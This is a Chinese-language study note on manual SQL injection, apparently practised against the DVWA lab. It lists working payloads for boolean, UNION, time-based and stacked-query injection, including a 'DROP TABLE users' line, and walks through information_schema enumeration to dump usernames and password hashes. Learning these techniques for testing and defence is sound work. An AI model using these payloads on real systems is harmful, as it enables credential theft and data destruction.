# 手动漏洞挖掘-SQL注入

## 漏洞发现步骤

第一步：判断是否存在漏洞

​	1.基于报错的检测方法(输入：', 返回错误信息)

​	2.基于布尔（真假）的检测(and or)

​	3.基于UNION联合查询的检测

​	4.基于时间的盲测的检测（时间函数sleep）

​	5.基于叠对查询的检测（；）

第二步：猜测后台查询语句

第三步：查询显示位

第四步：利用显示位输出信息



## 第一步：判断是否存在漏洞

### 正常查询返回

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913163747050.png" alt="image-20240913163747050" style="zoom:50%;" />

### 1.基于报错的检测方法

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913163914564.png" alt="image-20240913163914564" style="zoom: 67%;" />

### 2.基于布尔（真假）的检测(and or)

```
判断依据

当发生错误，表示数据库执行了我们的语句，可能没有没有回响。则表示存在漏洞
```



#### 判断数字类型：

```sql
1 and 1 = 1 
```

![image-20240913164339398](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913164339398.png)

```sql
1 and 1=2
```

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913164645633.png" alt="image-20240913164645633" style="zoom:67%;" />

#### 判断字符类型

简写

```
' 
"
```

![image-20240913165659978](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913165659978.png)



```sql
1' and '1' = '1
```

![image-20240913165126172](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913165126172.png)



```sql
1' and '1' = '2
```

![image-20240913164210216](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913164210216.png)



### 3.基于UNION联合查询的检测

```
'union select 1 #
```

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913171502064.png" alt="image-20240913171502064" style="zoom:50%;" />



<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913171535483.png" alt="image-20240913171535483" style="zoom:67%;" />

### 4 基于时间的盲测的检测（时间函数sleep）

```
'and (select * from (select(sleep(20)))a)--+
```

通过观察**平常查询**与**使用时间暂停**之间使用的时间差，来判断，是否存在时间盲测

![image-20240913170117289](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913170117289.png)





### 5.基于叠对查询的检测（；）

使用";"结束前面的语句，自己在写一个查询语句。

```sql
1'; DROP TABLE users; -- 
```



## 第二步：猜测后台查询语句

根据第一步的注入,

```sql
select * from table where id = ' ';

猜测闭合方式''
我们要在闭合中写入我们的注入语句
我们的整体框架：
select * from table where id = ' ';
' #
前面这个' 为了闭合查询语句前面的闭合
# 为了注释掉后面的内容
合起来：
select * from table where id = ''我们的注入语句 #';
```



## 第三步：查询显示位（order by）

什么是显示位：就是能在前台显示内容的字段

简单来说就是查询语句查询的字段

```sql
select user,password from table where id = ' ';
user,password 这两个就是显示字段
```



#### 方法1：使用：order by

不断修改字段进行排序，找到最大显示字段。找到报错与不报错的临界字段

```sql
1' order by 3#
```

不存在报错

![image-20240913173538996](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913173538996.png)

存在

```
1' order by 2#
```



<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913173618350.png" alt="image-20240913173618350" style="zoom:67%;" />

#### 方法2：联合查询union

不断修改字段进行联合查询排序（联合查询，要每一个显示字段都存在，才不会报错），找到最大显示字段。找到报错与不报错的临界字段

```
猜测只有一个显示位：
1'union select 1#
猜测有两个显示位：
1'union select 1,2#
```

存在完整显示字段（不报错）

![image-20240913174613275](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913174613275.png)



不存在完整字段报错

![image-20240913174656662](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913174656662.png)



## 第四步：利用显示位输出信息

根据我们当前获得到的账号权限，对数据库进行各种查询

```sql
 1'union select 1, database()# 显示当前数据库名称
 1'union select 1, version()# 显示当前数据库版本
```

![image-20240913174952550](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913174952550.png)



### 4.1 获取当前数据库名称

```sql
1'union select 1, database()# 显示当前数据库名称
```

![image-20240913175614927](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913175614927.png)



### 4.2 根据数据库名称，我们获取源数据库表

#### 4.2.1获取当前数据库的表

```
没有指定数据库字符类型
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#

指定数据库字符类型
1' union select 1,group_concat(table_name collate utf8_unicode_ci) from information_schema.tables where table_schema=database()#
```

报错：Illegal mix of collations for operation 'UNION'

需要指定数据库的字符类型

![image-20240913181048650](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913181048650.png)

![image-20240913181449385](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913181449385.png)



#### 4.2.2获取源数据库的数据表名称

```
1' union select 1, group_concat(table_name) from information_schema.tables#
```

![image-20240913185621240](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913185621240.png)



#### 4.2.3 获取全部数据库名称information_schema.tables

```
1' union select 1, group_concat(table_schema collate utf8_unicode_ci) from information_schema.tables#

'union select table_name,table_schema from information_schema.tables--+
```





### 4.3 根据数据库名称与表名称获取数据表全部字段名称

```sql
1' union select 1, group_concat(column_name collate utf8_unicode_ci) from information_schema.columns where table_schema = database() and table_name='users' #
```

```
字段名称
user_id,first_name,last_name,user,password,avatar,last_login,failed_login
```



![image-20240913182152912](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913182152912.png)



### 4.4 根据表名称 获取字段内容

根据显示位个数，打印指定字段：

```SQL
1' union select user,password from users#
```

![image-20240913182928052](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913182928052.png)



获取全部字段内容：

```
1' union select 1, concat_ws('-', user_id, first_name, last_name, user, password, avatar, last_login, failed_login) from users #
 
 concat_ws 函数可以指定分隔符'-'
 不指定分隔符，默认位逗号分隔
```

![image-20240913184803546](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913184803546.png)